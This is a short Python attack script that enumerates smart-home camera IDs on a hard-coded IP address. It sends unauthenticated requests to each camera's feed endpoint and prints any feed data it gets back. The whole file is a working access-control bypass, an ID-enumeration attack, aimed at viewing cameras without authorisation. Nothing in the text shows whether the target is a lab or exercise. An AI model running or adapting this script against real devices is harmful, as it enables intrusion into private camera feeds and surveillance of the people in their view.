import requests

def enumerate_camera_ids(base_url, start_id=1, end_id=5):
    """
    Try camera IDs in a certain range to see if we can access feeds.
    Adjust the range as needed.
    """
    for i in range(start_id, end_id + 1):
        camera_id = f"camera{i}"
        url = f"{base_url}/api/smart-home/cameras/{camera_id}/feed"
        print(f"[*] Checking {url}")
        try:
            r = requests.get(url) # Adjust the endpoint as needed
            if r.status_code == 200: # Check if the response is valid and contains camera feed data
                print(f"[+] Found camera feed for {camera_id}:")
                print(r.json())
            else:
                print(f"[-] Camera {camera_id} returned status {r.status_code}")
        except Exception as e:
            print(f"[!] Error accessing {camera_id}: {e}")

if __name__ == "__main__":
    base_url = "http://98.70.102.40:8080"
    enumerate_camera_ids(base_url, 100, 110)  # e.g., try camera100 to camera110